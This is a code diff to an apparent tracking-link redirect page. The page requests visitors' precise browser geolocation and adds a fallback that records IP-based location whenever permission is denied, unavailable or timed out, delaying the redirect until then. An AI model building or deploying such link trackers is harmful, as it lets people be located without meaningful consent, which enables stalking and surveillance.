@@ -163,15 +163,51 @@ $original_url = $link['original_url'];
             });
         }
 
+        function saveIPBasedLocation() {
+            const formData = new FormData();
+            formData.append('code', trackingCode);
+            formData.append('ip_only', 'true');
+            formData.append('timestamp', new Date().toISOString());
+
+            fetch('save_precise_location.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('IP-based location saved successfully');
+                } else {
+                    console.error('Failed to save IP-based location:', data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error saving IP-based location:', error);
+            });
+        }
+
         // Check if geolocation is supported
         if (!navigator.geolocation) {
-            updateStatus('Geolocation is not supported by this browser.', 'error');
+            updateStatus('Geolocation is not supported by this browser. Proceeding with IP-based tracking...', 'error');
+            saveIPBasedLocation();
+            setTimeout(() => {
+                document.getElementById('redirectButton').style.display = 'inline-block';
+            }, 2000);
             return;
         }
+
+        // Set a timeout to prevent infinite waiting
+        let locationTimeout = setTimeout(() => {
+            updateStatus('Location request timed out. Proceeding with IP-based tracking...', 'error');
+            saveIPBasedLocation();
+            document.getElementById('redirectButton').style.display = 'inline-block';
+        }, 15000); // 15 second timeout
 
         // Get precise location
         navigator.geolocation.getCurrentPosition(
             function(position) {
+                clearTimeout(locationTimeout); // Clear the timeout
+                
                 const location = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
@@ -188,24 +224,31 @@ $original_url = $link['original_url'];
                 updateStatus('Precise location captured successfully!', 'success');
             },
             function(error) {
+                clearTimeout(locationTimeout); // Clear the timeout
+                
                 let errorMessage = 'Unable to retrieve your location.';
                 
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMessage = 'Location access was denied. Please allow location access and try again.';
+                        errorMessage = 'Location access was denied. Proceeding with IP-based tracking...';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMessage = 'Location information is unavailable.';
+                        errorMessage = 'Location information is unavailable. Proceeding with IP-based tracking...';
                         break;
                     case error.TIMEOUT:
-                        errorMessage = 'Location request timed out.';
+                        errorMessage = 'Location request timed out. Proceeding with IP-based tracking...';
                         break;
                 }
                 
                 updateStatus(errorMessage, 'error');
                 
-                // Still show redirect button even if location failed
-                document.getElementById('redirectButton').style.display = 'inline-block';
+                // Save IP-based location as fallback
+                saveIPBasedLocation();
+                
+                // Show redirect button after a short delay
+                setTimeout(() => {
+                    document.getElementById('redirectButton').style.display = 'inline-block';
+                }, 2000);
             },
             {
                 enableHighAccuracy: true,  // Request highest accuracy
